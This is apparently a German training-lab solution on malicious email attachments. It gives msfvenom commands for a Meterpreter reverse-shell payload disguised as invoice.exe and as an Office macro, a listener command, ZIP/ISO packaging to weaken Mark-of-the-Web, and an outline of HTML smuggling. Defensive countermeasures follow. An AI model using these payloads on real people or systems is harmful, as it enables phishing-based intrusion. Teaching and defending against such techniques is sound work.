# Lösung – Übung 06: Malicious Attachments & Delivery

> Nur isolierte Lab-VM + eigener Handler. Harmloser Test-Payload.

## 1. Payloads erzeugen

```bash
# EXE (Windows-Test-VM):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o invoice.exe
# Makro (VBA) für Office:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f vba
# -> VBA-Code in ein Office-Dokument (Document_Open) einfügen
# Handler:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <KALI>; set LPORT 4444; run"
```
(Zum reinen Verständnis reicht ein Payload, der nur `calc.exe`/eine Markerdatei startet.)

## 2. Container + Mark of the Web

```bash
zip invoice.zip invoice.exe
genisoimage -o invoice.iso invoice.exe     # ISO
```
**MOTW:** aus dem Internet geladene Dateien bekommen ein „Zone.Identifier"-Attribut → Office/Windows warnen/blockieren. In **ISO/manchen ZIP** erben die enthaltenen Dateien das MOTW schlechter → Schutz greift nicht → genau deshalb nutzen Angreifer Container.

## 3. Kette ausführen (Lab)

Auf der isolierten Test-VM „Anhang" öffnen (Makro aktivieren / EXE starten) → Callback im Handler → Meterpreter-Session. Das demonstriert E-Mail → Anhang → Ausführung → Payload (ohne echten Versand).

## 4. HTML-Smuggling

Eine harmlose HTML-Datei enthält die Payload als **Base64/Blob im JavaScript**; erst **im Browser des Opfers** wird daraus clientseitig die Datei gebaut und zum Download angeboten. Da kein „Anhang" über die Leitung geht, **umgeht es Gateway-/Proxy-Scans**.

## 5. Gegenmaßnahmen

- **Office-Makros aus dem Internet blockieren** (Standard), VBA signieren/deaktivieren.
- **Attachment-Sandboxing** am Mail-Gateway, gefährliche Typen (ISO/HTA/LNK/JS) blocken.
- **EDR** (Verhaltenserkennung), **Application Allowlisting** (AppLocker/WDAC), MOTW durchsetzen.
- Awareness: unerwartete Anhänge nicht öffnen/Makros nicht aktivieren.

## Häufige Fehler / Troubleshooting

- **AV löscht Payload:** erwartbar; Lab-AV aus/Ausnahme, Test-VM. Encoding ≠ Bypass (siehe exploitation 06).
- **Makro läuft nicht:** „Geschützte Ansicht"/Makro-Block aktiv (= Schutz wirkt) → im Lab bewusst zulassen.
- **Kein Callback:** LHOST/Port/Handler; Windows-Firewall.
- **Verteilung an Dritte:** verboten – reine Lab-Demo.
